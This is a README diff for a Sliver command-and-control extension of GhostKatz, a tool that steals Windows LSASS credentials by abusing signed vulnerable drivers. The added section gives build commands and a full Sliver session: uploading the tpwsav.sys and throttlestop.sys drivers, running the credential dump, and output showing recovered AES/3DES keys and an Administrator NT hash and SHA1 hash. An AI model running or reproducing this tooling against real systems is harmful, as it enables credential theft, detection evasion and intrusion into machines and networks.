@@ -2,6 +2,78 @@
 
 An attempt to make https://github.com/RainbowDynamix/GhostKatz into a Sliver extension.
 
+## Usage with Sliver
+
+Build:
+```bash
+git clone https://github.com/technion/GhostKatz-sliver.git
+cd GhostKatz-sliver
+make
+```
+
+Then from inside Sliver:
+
+Note that, unlike the Cobalt Strike BOFF, you need to upload your driver yourself.
+
+```
+[server] sliver (MINIMUM_ASSUMPTION) > upload GhostKatz-sliver/drivers/tpwsav.sys 
+
+[*] Wrote 1 file successfully to C:\Users\Administrator\Downloads\tpwsav.sys
+
+[server] sliver (MINIMUM_ASSUMPTION) > upload GhostKatz-sliver/drivers/throttlestop.sys 
+
+[*] Wrote 1 file successfully to C:\Users\Administrator\Downloads\throttlestop.sys
+
+[server] sliver (MINIMUM_ASSUMPTION) > ghostkatz -- -mode "logonpasswords" -provider 1
+
+[*] Successfully executed ghostkatz (coff-loader)
+[*] Got output:
+[INFO] Provider: TPwSav
+[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE
+[+] Windows Build Number: 20348
+[+] Created driver service!
+[+] Started driver service.
+[+] Got handle to driver device.
+[*] Creating Superfetch database...
+[+] Superfetch database created.
+[*] Stealing LSASS credentials...
+[+] Stealing LSASS Credentials!
+[+] Lsass PID: 844
+[*] Locating LSASS EPROCESS...
+[+] LSASS EPROCESS VA: 0xffff9d0785725080
+[*] Searching for credential keys in lsasrv.dll...
+[+] Found credential key addresses.
+[*] Searching for LogonSessionList...
+[+] Found LogonSessionList signature at offset 0x54fe5.
+[+] LogonSessionList PA: 0xc60bf90
+[+] LogonSessionList found: 0x7ffb75fb3f90
+[+] Closing handle to vulnerable driver.
+[+] Deleted driver service!
+[+] Creating Global Pfn Database...
+[+] Building database...
+[+] Finished building database!
+[i] hAesKey: 0x2764d1f0230
+ -> Real AES Key: 9c4ab560f2e807e592c42a8ae808e949
+[i] h3DesKey: 0x2764d1f0000
+ -> Real 3Des Key: a9eab497b0f5c253938f3c3cf3baff7a440f9d792268e6ee
+[i] IV: 0x2595f93b7b0
+ -> Real IV Value: a83fa7d3b4ff361c
+
+
+===== [ LogonSessionList Information ] =====
+[i] LogonSessionListBase: 0x7ffb75fb3f90
+
+..
+
+[0000] Flink Base Address  : 0x2764d36e150
+     * Username    : Administrator
+     * Domain      : WIN-3JE4IJ85PCL
+     * NT Hash     : a1a97734be9baed9a57e1352dd2c6b91
+     * SHA1 Hash   : 9613d1f404c8ef3800e801b14cd08a5c13eab7a0
+
+[server] sliver (MINIMUM_ASSUMPTION) > 
+```
+
 ## Original readme
 
 Extract LSASS credentials directly from physical memory by abusing signed vulnerable drivers with physical memory read primitives via `MmMapIoSpace`, bypassing traditional user-mode detection capabilities.
